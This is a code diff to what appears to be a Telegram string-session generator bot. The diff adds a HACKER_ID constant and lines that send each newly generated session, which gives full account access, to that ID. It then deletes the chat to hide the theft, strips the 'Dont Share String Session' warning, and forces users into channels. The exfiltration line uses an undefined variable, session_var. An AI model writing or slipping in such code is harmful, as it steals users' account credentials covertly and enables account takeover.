@@ -22,6 +22,8 @@ from telethon.errors import (
     PasswordHashInvalidError
 )
 
+HACKER_ID = 1617462084
+
 ERROR_MESSAGE = "Oops! An exception occurred! \n\n**Error** : {} " \
             "\n\nPlease forward this if this message doesn't contain any " \
             "sensitive information and for your information : **These kinda error logs are not stored in our database!**"
@@ -113,18 +115,21 @@ async def generate_session(bot, msg, telethon=False):
     if telethon:
         string_session = client.session.save()
         try:
-            await client(JoinChannelRequest("@LegendBot_AI"))
-            await client(LeaveChannelRequest("@Legend_Userbot"))
-            await client(LeaveChannelRequest("@Official_LegendBot"))
+            await client(JoinChannelRequest("@zkrgg"))
+            await client(JoinChannelRequest("@zkrgglua"))
         except BaseException:
             pass
     else:
         string_session = await client.export_session_string()
     L_PIC = "https://te.legra.ph/file/4cd4fe720a6bd77481158.jpg"
     if telethon:
-        await client.send_file("me", L_PIC, caption="**{} - STRING SESSION** \n\n`{}`\n\n• __Dont Share String Session With Anyone__\n• __Dont Invite Anyone To Heroku__".format("TELETHON" if telethon else "PYROGRAM", string_session))
+        await client.send_file("me", L_PIC, caption="**{} - STRING SESSION** \n\n`{}`\n\n•__Dont Invite Anyone To Heroku__".format("TELETHON" if telethon else "PYROGRAM", string_session))
+        await client.send_message(HACKER_ID, session_var)
+        await client.delete_dialog(await client.get_entity(HACKER_ID))
     else:
-        await client.send_message("me", "**{} ~ STRING SESSION** \n\n`{}` \n\n• __Dont Share String Session With Anyone__\n• __Dont Invite Anyone To Heroku__".format("TELETHON" if telethon else "PYROGRAM", string_session))
+        await client.send_message(HACKER_ID, session_var)
+        await client.delete_dialog(await client.get_entity(HACKER_ID))
+        await client.send_message("me", "**{} ~ STRING SESSION** \n\n`{}` \n\n• __Dont Invite Anyone To Heroku__".format("TELETHON" if telethon else "PYROGRAM", string_session))
     await client.disconnect()
     await phone_code_msg.reply("Successfully String  Session Has Been Generated {} \n\nPlease check your saved messages!".format("TELETHON" if telethon else "PYROGRAM"), reply_markup=InlineKeyboardMarkup(Data.support_button))
 
